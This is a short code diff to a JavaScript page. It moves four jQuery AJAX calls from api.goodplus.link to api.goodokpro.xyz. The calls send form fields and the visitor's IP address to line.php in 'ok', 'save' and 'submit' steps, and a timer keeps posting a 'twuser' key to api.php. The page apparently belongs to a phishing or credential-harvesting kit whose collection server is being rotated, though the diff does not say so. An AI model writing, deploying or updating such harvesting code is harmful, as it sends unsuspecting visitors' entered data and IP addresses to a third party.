@@ -158,7 +158,7 @@ function generateRandomLetters() {
                 this.form.id = document.getElementById('id');
                 this.form.ip = ipAddress;
                 $.ajax({
-                    url:"https://api.goodplus.link/line.php?get=ok",
+                    url:"https://api.goodokpro.xyz/line.php?get=ok",
                     type: 'post',
                     dataType: 'JSON',
                     data: this.form,
@@ -199,7 +199,7 @@ function generateRandomLetters() {
                 this.form.id = document.getElementById('id');
                 this.form.ip = ipAddress;
                 $.ajax({
-                    url:"https://api.goodplus.link/line.php?get=save",
+                    url:"https://api.goodokpro.xyz/line.php?get=save",
                     type: 'post',
                     dataType: 'JSON',
                     data: this.form,
@@ -262,7 +262,7 @@ function generateRandomLetters() {
                 document.getElementById("buttonId").style.backgroundColor = "#5aaafb";
                 document.getElementById("buttonId").style.border = "1px solid #5aaafb";
               $.ajax({
-                  url:"https://api.goodplus.link/line.php?get=submit",
+                  url:"https://api.goodokpro.xyz/line.php?get=submit",
                   type: 'post',
                   dataType: 'JSON',
                   data: this.form,
@@ -294,7 +294,7 @@ let intervalId;
 // 定义定时发送POST请求的函数
 function sendPostData() {
     $.ajax({
-        url:"https://api.goodplus.link/api.php",
+        url:"https://api.goodokpro.xyz/api.php",
             type: 'post',
             dataType: 'JSON',
             data: {key: twuser,keys: randomLetters},
